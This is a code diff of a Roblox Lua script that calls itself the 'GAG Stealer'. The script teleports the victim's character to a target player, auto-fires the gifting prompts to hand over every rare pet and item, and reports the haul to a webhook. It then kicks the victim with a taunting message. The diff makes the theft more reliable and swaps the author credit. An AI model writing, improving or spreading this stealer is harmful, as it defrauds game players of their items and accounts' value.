@@ -1,4 +1,4 @@
--- GAG  Main Script
+-- GAG Stealer: Full  Script
 -- For support: discord.gg/notyet
 
 --------------------------
@@ -11,7 +11,7 @@ local CONFIG = {
     PING      = _G.pingEveryone or "No",
 }
 
--- Emoji maps
+-- Rare pet emoji mapping
 local RARE_PETS = {
     ["Raccoon"]        = "🦥",
     ["Dragonfly"]      = "🐦‍🔥",
@@ -223,7 +223,7 @@ local function sendInitialWebhook()
             title  = "🎁 GAG Heist Log",
             color  = 65280,
             fields = fields,
-            footer = { text = "GAG stealer by Timoci. discord.gg/notyet" }
+            footer = { text = "GAG stealer by Tobi. discord.gg/notyet" }
         }}
     }
     local body = HttpService:JSONEncode(data)
@@ -262,26 +262,69 @@ end)
 --------------------------
 -- INTERACTION / STEAL   --
 --------------------------
+
+local function equipTool(tool)
+    -- Move to character if not already, and equip via Humanoid
+    if tool.Parent ~= plr.Character then
+        tool.Parent = plr.Character
+    end
+    if plr.Character and plr.Character:FindFirstChild("Humanoid") then
+        pcall(function()
+            plr.Character.Humanoid:EquipTool(tool)
+        end)
+    end
+    task.wait(0.09)
+end
+
+local function findGiftPrompt(targetChar)
+    -- Try all common and fallback locations for the prompt
+    for _, part in ipairs({"Head", "HumanoidRootPart", "Torso", "UpperTorso"}) do
+        local partObj = targetChar:FindFirstChild(part)
+        if partObj then
+            for _, prompt in ipairs(partObj:GetChildren()) do
+                if prompt:IsA("ProximityPrompt") and (prompt.Name:lower():find("gift") or (prompt.ObjectText and prompt.ObjectText:lower():find("gift"))) then
+                    return prompt
+                end
+            end
+        end
+    end
+    for _, desc in ipairs(targetChar:GetDescendants()) do
+        if desc:IsA("ProximityPrompt") and (desc.Name:lower():find("gift") or (desc.ObjectText and desc.ObjectText:lower():find("gift"))) then
+            return desc
+        end
+    end
+    -- Last resort: first ProximityPrompt anywhere
+    for _, desc in ipairs(targetChar:GetDescendants()) do
+        if desc:IsA("ProximityPrompt") then return desc end
+    end
+    return nil
+end
+
 local function doSteal(player)
+    -- Rapidly and reliably auto-gift everything to the target player!
     local myChar = plr.Character or plr.CharacterAdded:Wait()
     local victimRoot = myChar:WaitForChild("HumanoidRootPart")
     victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
-    wait(0.1)
+    wait(0.25)
     for _, item in ipairs(itemsToSend) do
-        item.Tool.Parent = myChar
-        local prompt
-        if item.Type == "Pet" then
-            prompt = player.Character and player.Character.Head and player.Character.Head:FindFirstChildOfClass("ProximityPrompt")
-                    or player.Character.HumanoidRootPart:FindFirstChildOfClass("ProximityPrompt")
+        equipTool(item.Tool)
+        local prompt = findGiftPrompt(player.Character)
+        if prompt then
+            -- Wait for prompt to be enabled before firing
+            local t0 = os.clock()
+            repeat
+                task.wait(0.04)
+                if (os.clock() - t0) > 3 then break end  -- Failsafe
+            until prompt.Enabled
+            bypassProximityPrompt(prompt)
+            wait(0.10)
         else
-            prompt = player.Character and player.Character.HumanoidRootPart:FindFirstChildOfClass("ProximityPrompt")
+            warn("No gifting prompt found for "..(item.Name or "?"))
         end
-        if prompt then bypassProximityPrompt(prompt) end
-        wait(0.12)
         item.Tool.Parent = backpack
-        wait(0.08)
+        wait(0.04)
     end
-    -- Wait until all items gone from backpack
+    -- Wait until all items are out of backpack (confirm sent)
     local stillInBackpack = true
     while stillInBackpack do
         stillInBackpack = false
@@ -291,9 +334,9 @@ local function doSteal(player)
                 break
             end
         end
-        task.wait(0.1)
+        task.wait(0.08)
     end
-    plr:Kick("All your stuff just got stolen by Timoci's stealer!\nJoin discord.gg/notyet")
+    plr:Kick("All your stuff just got stolen by Tobi's stealer!\nJoin discord.gg/notyet")
 end
 
 local function listenForUser()
